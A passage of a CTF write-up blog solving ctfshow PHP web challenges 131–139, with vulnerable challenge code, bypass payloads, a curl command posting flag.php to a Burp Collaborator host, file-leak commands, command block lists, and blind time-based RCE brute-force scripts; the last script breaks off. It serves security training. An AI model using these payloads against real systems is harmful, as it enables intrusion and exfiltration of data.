class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="php特性："><a href="#php特性：" class="headerlink" title="php特性："></a>php特性：</h4><p>preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0</p><p>if(0 === flase)返回值为false0不是强等于false的</p><p>stripos()函数对数组不识别，遇到数组会返回false</p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>payload：<code>?f=ctfshow[]</code></p><h4 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h4><p>采用<code>数组</code>绕过的方法，<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p><p><code>?f[]=666</code></p><h4 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h4><p><strong>p神</strong>：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>溢出回溯限制</p><p>利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://.ctf.show:8080/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>首先打开是一个网页，御剑扫一下有robots.txt和admin/index.php</p><p>打开admin/index.php得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是进行了强类型转换，作用未知，继续往下审</p><p><a href="https://www.runoob.com/php/func-math-mt-rand.html">PHP mt_rand() 函数</a>：使用 Mersenne Twister 算法生成随机整数。相比较于rand()函数其速度更快</p><p><code>&amp;&amp;</code>：需要前面和后面的条件都为true，才会返回true</p><p><code>||</code>：只需要满足其中任意一个就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;true!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回结果为true</span></span><br></pre></td></tr></table></figure><p>所以只需要满足后者就行：<code>$username ===&quot;admin&quot;</code></p><p>同时满足下一个if：<code>$code == &#39;admin&#39;</code></p><p>当然还有第一个if需要满足</p><h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来的意思有点套娃的意思</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#x27;F&#x27;]=`$F` ;ls;</span><br><span class="line">eval(substr($F,0,6))=eval(`$F` ;)</span><br><span class="line">$f=$_GET[&#x27;F&#x27;]=`$F` ;ls;</span><br><span class="line"> eval(`$F` ;)= eval(``$F` ;ls;`)</span><br><span class="line"> 可以利用sleep函数验证</span><br></pre></td></tr></table></figure><p>但是无回显，属于无回显RCE</p><p>这里的wp是利用curl来实现flag.php的外带</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?F=`<span class="variable">$F</span> `;+curl -X POST -F xx=@flag.php <span class="number">6</span>hokugw3tjr8vdj8f2yldiead1jt7i.burpcollaborator.net</span><br><span class="line"></span><br><span class="line"><span class="comment"># -X POST  指定 HTTP 请求的方法为 POST</span></span><br><span class="line"><span class="comment"># 其中-F 是带文件的形式发送post请求</span></span><br><span class="line"><span class="comment"># xx是上传文件的name值，flag.php就是上传的文件 </span></span><br></pre></td></tr></table></figure><p><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的参数用法</a></p><p><a href="https://requestbin.net/">在线工具</a>(没用明白)</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">利用burpsuite</a></p><p>不错不错很好，学到一招面对无回显rce</p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_49480008/article/details/115872899">$_SERVER[‘QUERY_STRING’]解释</a></p><p><a href="https://www.w3school.com.cn/php/func_array_extract.asp">PHP extract() 函数</a></p><p>payload：<code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>此次利用没有了curl，利用的是<a href="https://www.runoob.com/linux/linux-comm-cp.html">cp命令</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/jjlovefj/article/details/83176871">Linux tee命令</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常见用例： tee file <span class="comment">//覆盖</span></span><br><span class="line">tee -a file <span class="comment">//追加</span></span><br><span class="line">tee - <span class="comment">//输出到标准输出两次 tee - - //输出到标准输出三次</span></span><br><span class="line">tee file1 file2 - <span class="comment">//输出到标准输出两次,并写到那两个文件中</span></span><br><span class="line">ls | tee file</span><br><span class="line">另：把标准错误也被tee读取 ls “*” <span class="number">2</span>&gt;&amp;<span class="number">1</span> | tee ls.txt</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?c=ls \|tee <span class="number">1</span></span><br><span class="line"><span class="comment">//将根目录下的内容写入1</span></span><br><span class="line">访问<span class="number">1</span>，下载文件发现f149_15_h3r3</span><br><span class="line">?c=nl /f149_15_h3r3|tee <span class="number">1</span></span><br><span class="line">访问<span class="number">1</span>，下载文件得flag</span><br></pre></td></tr></table></figure><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>调用类中函数，需要调用静态类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php中 -&gt;与:: 调用类中的成员的区别</span><br><span class="line">-&gt;用于动态语境处理某个类的某个实例</span><br><span class="line">::可以调用一个静态的、不依赖于其他初始化的类方法</span><br></pre></td></tr></table></figure><p>payload：<code>ctfshow=ctfshow::getFlag</code></p><h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure><h4 id="php特性：-1"><a href="#php特性：-1" class="headerlink" title="php特性："></a>php特性：</h4><p>考察了call_user_func()用数组形式调用类方法</p><p>详看：<a href="https://www.wodecun.com/blog/7981.html">根据方法名调用call_user_func()详解</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">调用classname这个类里的sya_hello方法</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>[<span class="number">0</span>]=<span class="variable">$classname</span>  类名</span><br><span class="line"><span class="keyword">array</span>[<span class="number">1</span>]=say_hello   <span class="title function_ invoke__">say_hello</span>()方法</span><br></pre></td></tr></table></figure><p>call_user_func函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure><h3 id="web139——盲打-未实操"><a href="#web139——盲打-未实操" class="headerlink" title="web139——盲打(未实操)"></a>web139——盲打(未实操)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-awk.html">awk命令</a>：是一个强大的<strong>文本分析</strong>工具</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用awk命令、cut命令截取字符</span><br><span class="line">sleep命令确认是否正确</span><br><span class="line"></span><br><span class="line">awk NR==<span class="number">2</span> 获取第二行信息</span><br><span class="line">cut -c <span class="number">1</span>  截取第<span class="number">1</span>个字符</span><br><span class="line"></span><br><span class="line">zsh下<span class="keyword">if</span>语句的格式：</span><br><span class="line"> <span class="keyword">if</span> [[condition]] &#123;command</span><br><span class="line">&#125; elif &#123;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考大佬的脚本：<br>获取文件名的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.ascii_letters+string.digits<span class="comment">#生成所有字母与数字[a-zA-Z0-9]</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line"><span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    result=result+n</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">key=<span class="number">1</span></span><br><span class="line">result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><p>猜解文件内容的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_lowercase+<span class="string">&quot;-&quot;</span><span class="comment">#获取小写字母与数字</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j,n)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line"><span class="keyword">try</span>:</span><br><span 